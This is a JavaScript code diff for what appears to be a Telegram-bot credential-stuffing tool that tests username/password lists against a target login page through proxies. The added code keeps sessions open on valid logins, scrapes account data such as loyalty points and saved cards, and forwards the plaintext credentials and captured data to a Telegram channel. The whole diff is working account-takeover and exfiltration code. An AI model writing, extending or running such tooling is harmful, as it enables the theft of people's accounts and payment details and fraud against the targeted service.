@@ -24,7 +24,11 @@ const {
   buildBatchAborted,
   buildBatchFailed,
   buildBatchAborting,
+  buildCheckAndCaptureResult,
 } = require('../messages');
+const { captureAccountData } = require('../../automation/http/httpDataCapture');
+const { closeSession } = require('../../automation/http/sessionManager');
+const { forwardValidToChannel } = require('../channelForwarder');
 const { setActiveBatch, clearActiveBatch, deletePendingBatch } = require('./batchState');
 const { createCircuitBreaker } = require('./circuitBreaker');
 const { getConfigService } = require('../../shared/config/configService');
@@ -255,6 +259,7 @@ function runSingleNodeBatch(ctx, batch, msgId, statusMsg, options, helpers, key,
           proxy: options.proxy,
           targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
           batchMode: true,
+          deferCloseOnValid: true, // Keep session open for capture/forwarding
         });
       } catch (err) {
         result = { status: 'ERROR', message: err.message };
@@ -275,6 +280,25 @@ function runSingleNodeBatch(ctx, batch, msgId, statusMsg, options, helpers, key,
 
     if (result.status === 'VALID') {
       validCreds.push({ username: cred.username, password: cred.password });
+      
+      // Capture and forward to channel if session available
+      if (result.session) {
+        try {
+          const capture = await captureAccountData(result.session, { timeoutMs: options.timeoutMs || 60000 });
+          const message = buildCheckAndCaptureResult(result, capture, cred.username, 0, cred.password, result.ipAddress, null);
+          
+          // Forward to channel (non-blocking, don't fail batch on forward error)
+          forwardValidToChannel(ctx.telegram, cred.username, cred.password, message, capture).catch(err => {
+            log.debug(`Forward failed: ${err.message}`);
+          });
+          
+          log.info(`[batch] captured ${cred.username.slice(0,5)}***: points=${capture.points} cards=${capture.profile?.cards?.length || 0}`);
+        } catch (captureErr) {
+          log.warn(`[batch] capture failed ${cred.username.slice(0,5)}***: ${captureErr.message}`);
+        } finally {
+          closeSession(result.session);
+        }
+      }
     }
 
     // Non-blocking cache update - skip ERROR so credentials can be retried later
@@ -329,7 +353,15 @@ function runSingleNodeBatch(ctx, batch, msgId, statusMsg, options, helpers, key,
 
       const elapsed = Date.now() - startedAt;
       const summary = batch.aborted
-        ? buildBatchAborted({ filename: batch.filename, total: batch.count, processed })
+        ? buildBatchAborted({
+            filename: batch.filename,
+            total: batch.count,
+            skipped: batch.skipped || 0,
+            counts,
+            elapsedMs: elapsed,
+            validCreds,
+            processed,
+          })
         : buildBatchSummary({
             filename: batch.filename,
             total: batch.count,
